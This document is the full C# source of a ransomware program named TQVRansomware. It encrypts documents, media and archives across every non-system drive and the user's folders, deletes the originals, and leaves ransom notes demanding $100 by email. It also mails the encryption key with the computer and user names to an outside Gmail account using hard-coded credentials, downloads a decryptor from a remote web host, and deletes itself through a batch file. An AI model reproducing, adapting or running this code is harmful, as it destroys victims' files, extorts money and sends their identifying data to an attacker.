using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;

namespace TQVRansomware;

internal class Program
{
	private static string password = "";

	private static string randomid = "";

	private static string username = Environment.UserName;

	private static string computername = Environment.MachineName;

	private static void Main(string[] args)
	{
		password = randomstr(16);
		randomid = randomstr(8);
		start();
		sendPwd();
		stop();
	}

	private static void EncryptFile(string inputFile)
	{
		try
		{
			new UnicodeEncoding();
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			byte[] bytes = Encoding.UTF8.GetBytes(password);
			string path = inputFile + ".TQV";
			FileStream fileStream = new FileStream(path, FileMode.Create);
			ICryptoTransform transform = rijndaelManaged.CreateEncryptor(bytes, bytes);
			CryptoStream cryptoStream = new CryptoStream(fileStream, transform, CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(inputFile, FileMode.Open, FileAccess.Read);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Close();
			cryptoStream.Close();
			fileStream.Close();
			File.Delete(inputFile);
		}
		catch (Exception)
		{
		}
	}

	private static string randomstr(int n)
	{
		string text = "";
		string text2 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&*()_+=-";
		Random random = new Random();
		for (int i = 0; i < n; i++)
		{
			text += text2[random.Next(text2.Length)];
		}
		return text;
	}

	private static void EncryptFolder(string location)
	{
		string[] source = new string[2]
		{
			Environment.GetEnvironmentVariable("windir"),
			Path.GetTempPath().Substring(0, Path.GetTempPath().Length - 1)
		};
		if (source.Contains(location))
		{
			return;
		}
		try
		{
			string[] source2 = new string[16]
			{
				".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf", ".rar", ".zip",
				".mp3", ".mp4", ".wmv", ".bmp", ".png", ".jpg"
			};
			string[] files = Directory.GetFiles(location);
			string[] directories = Directory.GetDirectories(location);
			for (int i = 0; i < files.Length; i++)
			{
				string value = Path.GetExtension(files[i])!.ToLower();
				if (source2.Contains(value) && !files[i].Contains("@@README.TXT"))
				{
					EncryptFile(files[i]);
				}
			}
			Message(location);
			for (int j = 0; j < directories.Length; j++)
			{
				EncryptFolder(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	private static void Message(string location)
	{
		string[] contents = new string[1] { "Your files had been encrypted Please send me $100 to get your files back\r\nSend your information includes Security code, Computer name and Username to truongquocvi@gmail.com\r\nYour security code is: " + randomid + "\nAfter receiving password, run TQVDecrypt on your desktop to decrypt files" };
		File.WriteAllLines(location + "\\@@README.TXT", contents);
	}

	private static void sendPwd()
	{
		string subject = randomid + "__" + computername + "__" + username;
		MailMessage message = new MailMessage("gavaivt@gmail.com", "gavaivt@gmail.com", subject, password);
		SmtpClient smtpClient = new SmtpClient("smtp.gmail.com", 587);
		smtpClient.EnableSsl = true;
		smtpClient.Credentials = new NetworkCredential("gavaivt@gmail.com", "qweqr1234");
		smtpClient.Send(message);
	}

	private static void start()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		for (int i = 0; i < drives.Length; i++)
		{
			if (drives[i].Name != Path.GetPathRoot(Environment.SystemDirectory))
			{
				EncryptFolder(drives[i].Name);
			}
		}
		string[] array = new string[6]
		{
			Environment.GetFolderPath(Environment.SpecialFolder.Personal),
			Environment.GetFolderPath(Environment.SpecialFolder.MyMusic),
			Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
			Environment.GetFolderPath(Environment.SpecialFolder.MyVideos),
			Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
			Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads")
		};
		for (int j = 0; j < array.Length; j++)
		{
			EncryptFolder(array[j]);
		}
	}

	private static void stop()
	{
		WebClient webClient = new WebClient();
		webClient.DownloadFile(new Uri("http://download.truongquocvi.com/TQVDecrypt.exe"), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\TQVDecrypt.exe");
		string[] contents = new string[1] { "del /F \"" + Assembly.GetEntryAssembly()!.Location + "\"" };
		string path = Path.GetTempPath() + "\\delete.bat";
		File.WriteAllLines(path, contents);
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = Path.GetTempPath() + "\\delete.bat";
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}
}
